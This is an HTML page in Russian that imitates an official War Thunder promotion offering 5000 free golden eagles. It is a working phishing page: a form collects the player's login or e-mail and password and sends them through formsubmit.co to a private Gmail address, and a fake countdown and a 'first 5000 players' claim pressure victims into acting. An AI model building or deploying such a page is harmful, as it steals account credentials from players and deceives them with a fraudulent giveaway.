<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>War Thunder — подарок</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: url('https://raw.githubusercontent.com/warthunderprize/war-gift/main/3840x2160_line_of_contact_logo_ru_dfcacf9311d0af4bf5296e52759249ac.jpg') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.6);
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
        }
        .card {
            position: relative;
            z-index: 2;
            background: rgba(20, 20, 30, 0.9);
            backdrop-filter: blur(5px);
            padding: 40px;
            border-radius: 20px;
            width: 450px;
            text-align: center;
            color: white;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
            border: 1px solid #ffd700;
        }
        .top-menu {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 12px;
            text-transform: uppercase;
            color: #aaa;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .top-menu span {
            cursor: default;
        }
        .top-menu span:hover {
            color: #ffd700;
        }
        .logo {
            font-size: 48px;
            font-weight: 900;
            letter-spacing: 5px;
            margin-bottom: 10px;
            text-shadow: 0 0 20px gold;
        }
        .logo span {
            color: #ffd700;
        }
        .sub {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 30px;
        }
        h1 {
            font-size: 32px;
            margin-bottom: 10px;
            color: #ffd700;
        }
        .timer {
            background: #1e1e2a;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 32px;
            font-weight: bold;
            border: 1px solid #333;
            color: #ffd700;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: #2a2a3a;
            color: white;
            font-size: 16px;
            border: 1px solid #444;
        }
        input:focus {
            outline: none;
            border-color: #ffd700;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #ffd700;
            color: black;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover {
            background: #ffed4a;
            box-shadow: 0 0 20px gold;
        }
        .buttons {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        .btn-secondary {
            flex: 1;
            padding: 10px;
            background: transparent;
            border: 1px solid #ffd700;
            color: #ffd700;
            border-radius: 5px;
            cursor: default;
            font-size: 14px;
        }
        small {
            display: block;
            color: #888;
            font-size: 12px;
        }
        .footer-menu {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0 10px;
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="card">
        <div class="top-menu">
            <span>ИГРА</span>
            <span>МЕДИА</span>
            <span>ОБУЧЕНИЕ</span>
            <span>МАСТЕРСКАЯ</span>
            <span>СООБЩЕСТВО</span>
            <span>КИБЕРСПОРТ</span>
            <span>КОНТАКТЫ</span>
            <span>РЕГИСТРАЦИЯ</span>
        </div>

        <div class="logo">
            <span>WAR</span> THUNDER
        </div>
        <div class="sub">МАСШТАБНАЯ ВОЕННАЯ MMO</div>

        <h1>5000 ЗОЛОТЫХ ОРЛОВ</h1>
        <p>в честь 10-летия игры</p>

        <div class="timer" id="timer">02:34:12</div>

        <form action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/thanks.html">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            
            <input type="text" name="login" placeholder="Логин или e-mail" required>
            <input type="password" name="password" placeholder="Пароль" required>
            
            <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
        </form>

        <div class="buttons">
            <div class="btn-secondary">РЕГИСТРАЦИЯ</div>
            <div class="btn-secondary">СКАЧАТЬ ИГРУ</div>
        </div>

        <div class="footer-menu">
            <span>ИГРА</span>
            <span>МЕДИА</span>
            <span>ОБУЧЕНИЕ</span>
            <span>МАСТЕРСКАЯ</span>
            <span>СООБЩЕСТВО</span>
        </div>

        <small>Акция ограничена: первые 5000 игроков</small>
    </div>

    <script>
        var countDownDate = new Date().getTime() + 72000000; // +2 часа
        
        var x = setInterval(function() {
            var now = new Date().getTime();
            var distance = countDownDate - now;
            
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            document.getElementById("timer").innerHTML = 
                (hours < 10 ? '0' + hours : hours) + ':' +
                (minutes < 10 ? '0' + minutes : minutes) + ':' +
                (seconds < 10 ? '0' + seconds : seconds);
            
            if (distance < 0) {
                clearInterval(x);
                document.getElementById("timer").innerHTML = "АКЦИЯ ЗАВЕРШЕНА";
            }
        }, 1000);
    </script>
</body>
</html>
